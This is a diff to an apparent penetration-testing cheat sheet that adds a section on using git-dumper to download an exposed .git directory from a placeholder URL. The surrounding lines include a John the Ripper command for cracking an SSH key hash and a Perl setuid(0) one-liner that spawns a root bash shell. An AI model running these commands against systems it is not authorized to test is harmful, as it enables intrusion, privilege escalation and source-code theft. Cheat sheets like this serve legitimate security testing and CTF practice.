@@ -88,6 +88,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
 perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
 
+### Git Dumper
+
+```
+pip install git-dumper
+git dumper https://some-url/.git ./meow
+ls ./meow
+```
+
 
 ### Metasploit basic usage
 ```shell
